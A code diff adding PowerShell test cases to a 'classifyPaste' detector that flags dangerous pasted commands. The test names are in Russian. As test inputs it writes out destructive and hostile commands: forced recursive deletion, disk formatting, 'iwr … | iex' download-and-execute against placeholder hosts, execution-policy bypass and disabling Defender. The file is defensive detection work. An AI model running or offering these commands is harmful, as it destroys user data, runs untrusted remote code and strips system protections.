@@ -91,3 +91,35 @@ describe("classifyPaste — края", () => {
     expect(classifyPaste("   rm -rf /tmp/x  ")[0].line).toBe("rm -rf /tmp/x");
   });
 });
+
+describe("classifyPaste — PowerShell", () => {
+  it("Remove-Item и псевдонимы с -Recurse -Force, в том числе сокращённые", () => {
+    expect(labels("Remove-Item C:\\data -Recurse -Force")).toContain("Remove-Item -Recurse -Force");
+    expect(labels("rm -Recurse -Force .\\build")).toContain("Remove-Item -Recurse -Force");
+    expect(labels("ri .\\x -r -fo")).toContain("Remove-Item -Recurse -Force");
+    expect(labels("del -rec -force C:\\tmp")).toContain("Remove-Item -Recurse -Force");
+  });
+
+  it("Remove-Item без -Force или без -Recurse не считается опасным по этому правилу", () => {
+    expect(labels("Remove-Item .\\a.txt")).toHaveLength(0);
+    expect(labels("Remove-Item .\\dir -Recurse")).not.toContain("Remove-Item -Recurse -Force");
+    expect(labels("Remove-Item .\\a.txt -Force")).not.toContain("Remove-Item -Recurse -Force");
+  });
+
+  it("диски, скачать-и-выполнить, выключение, снижение защиты", () => {
+    expect(labels("Format-Volume -DriveLetter D")).toContain("Format-Volume / Clear-Disk");
+    expect(labels("Clear-Disk -Number 1 -RemoveData")).toContain("Format-Volume / Clear-Disk");
+    expect(labels("iwr https://x.example/i.ps1 | iex")).toContain("iwr … | iex");
+    expect(labels("irm https://x.example/i.ps1 | Invoke-Expression")).toContain("iwr … | iex");
+    expect(labels("iex (New-Object Net.WebClient).DownloadString('https://x.example/a')")).toContain("iwr … | iex");
+    expect(labels("Restart-Computer -Force")).toContain("Stop-Computer / Restart-Computer");
+    expect(labels("Set-ExecutionPolicy Bypass -Scope Process")).toContain("Set-ExecutionPolicy Unrestricted/Bypass");
+    expect(labels("Set-MpPreference -DisableRealtimeMonitoring $true")).toContain("отключение Defender");
+  });
+
+  it("обычные команды PowerShell ничего не задевают", () => {
+    for (const cmd of ["Get-ChildItem -Recurse", "Get-Process | Sort-Object CPU", "Set-Location ~", "Invoke-WebRequest https://x.example -OutFile a.zip", "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser"]) {
+      expect(labels(cmd), cmd).toHaveLength(0);
+    }
+  });
+});
